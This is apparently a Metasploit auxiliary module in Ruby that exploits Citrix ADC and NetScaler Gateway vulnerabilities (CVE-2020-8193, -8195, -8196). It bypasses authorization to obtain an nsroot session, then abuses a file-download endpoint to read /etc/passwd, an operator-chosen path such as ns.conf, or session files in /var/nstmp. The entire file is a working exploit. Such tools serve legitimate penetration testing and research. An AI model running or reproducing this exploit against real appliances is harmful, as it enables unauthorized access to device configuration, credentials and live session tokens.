##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Citrix ADC NetScaler - Local File Inclusion (Metasploit)',
      'Description'    => %{
        The remote device is affected by multiple vulnerabilities.

        An authorization bypass vulnerability exists in Citrix ADC and NetScaler Gateway devices.
        An unauthenticated remote attacker with access to the `NSIP/management interface` can exploit
        this to bypass authorization (CVE-2020-8193).

        And Information disclosure (CVE-2020-8195 and CVE-2020-8196) - but at this time unclear which.
      },
      'Author'         => [
        'Donny Maasland', # Discovery
        'mekhalleh (RAMELLA Sébastien)' # Module author (Zeop Entreprise)
      ],
      'References'     => [
        ['CVE', '2020-8193'],
        ['CVE', '2020-8195'],
        ['CVE', '2020-8196'],
        ['URL', 'https://dmaasland.github.io/posts/citrix.html'],
        ['URL', 'https://research.nccgroup.com/2020/07/10/rift-citrix-adc-vulnerabilities-cve-2020-8193-cve-2020-8195-and-cve-2020-8196-intelligence/amp/'],
        ['URL', 'https://github.com/jas502n/CVE-2020-8193']
      ],
      'DisclosureDate' => '2020-07-09',
      'License'        => MSF_LICENSE,
      'DefaultOptions' => {
        'RPORT' => 443,
        'SSL' => true
      }
    ))

    register_options([
      OptEnum.new('MODE', [true, 'Start type.', 'discovery', [ 'discovery', 'interactive', 'sessions']]),
      OptString.new('PATH', [false, 'File or directory you want to read', '/nsconfig/ns.conf']),
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  def create_session
    params = 'type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1'

    request = {
      'method' => 'POST',
      'uri' => "#{normalize_uri(target_uri.path, 'pcidss', 'report')}?#{params}",
      'ctype' => 'application/xml',
      'headers' => {
        'X-NITRO-USER' => Rex::Text.rand_text_alpha(6..8),
        'X-NITRO-PASS' => Rex::Text.rand_text_alpha(6..8)
      },
      'data' => '<appfwprofile><login></login></appfwprofile>'
    }
    request = request.merge({'cookie' => @cookie}) if @cookie

    response = send_request_raw(request)
    unless response && response.code == 406
      print_error("#{@message_prefix} - No response to session request.")
      return
    end

    response.get_cookies
  end

  def fix_session_rand
    response = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'menu', 'ss'),
      'cookie' => @cookie,
      'vars_get' => {
        'sid' => 'nsroot',
        'username' => 'nsroot',
        'force_setup' => '1'
      }
    )

    if response && response.code == 302
      location = response.headers['location']

      response = send_request_cgi(
        'method' => 'GET',
        'uri' => location,
        'cookie' => @cookie
      )

      return unless response && response.code == 200
    end

    response.to_s.scan(/rand = "([^"]+)"/).join
  end

  def read_lfi(path, var_rand)
    params = "filter=path:#{path}"

    request = {
      'method' => 'POST',
      'uri' => "#{normalize_uri(target_uri.path, 'rapi', 'filedownload')}?#{params}",
      'cookie' => @cookie,
      'ctype' => 'application/xml',
      'headers' => {
        'X-NITRO-USER' => Rex::Text.rand_text_alpha(6..8),
        'X-NITRO-PASS' => Rex::Text.rand_text_alpha(6..8),
        'rand_key' => var_rand
      },
      'data' => '<clipermission></clipermission>'
    }

    response = send_request_raw(request)
  end

  def run_host(ip)
    proto = (datastore['SSL'] ? 'https' : 'http')
    @message_prefix = "#{proto}://#{ip}:#{datastore['RPORT']}"

    @cookie = create_session
    if @cookie && @cookie =~ /SESSID/
      print_status("#{@message_prefix} - Got session: #{@cookie.split(' ')[0]}")

      var_rand = fix_session_rand
      unless var_rand
        print_error("#{@message_prefix} - Unable to get rand value.")
        return Exploit::CheckCode::Unknown
      end
      print_status("#{@message_prefix} - Got rand: #{var_rand}")

      print_status("#{@message_prefix} - Re-breaking session...")
      create_session

      case datastore['MODE']
      when /discovery/
        response = read_lfi('/etc/passwd'.gsub('/', '%2F'), var_rand)
        if response.code == 406
          if response.body.include? ('root:*:0:0:')
            print_warning("#{@message_prefix} - Vulnerable.")

            return Exploit::CheckCode::Vulnerable
          end
        end
      when /interactive/
        # TODO: parse response
        response = read_lfi(datastore['PATH'].gsub('/', '%2F'), var_rand)
        if response.code == 406
          print_line("#{response.body}")
        end

        return
      when /sessions/
        # TODO: parse response
        response = read_lfi('/var/nstmp'.gsub('/', '%2F'), var_rand)
        if response.code == 406
          print_line("#{response.body}")
        end

        return
      end
    end
    print_good("#{@message_prefix} - Not Vulnerable.")

    return Exploit::CheckCode::Safe
  end

end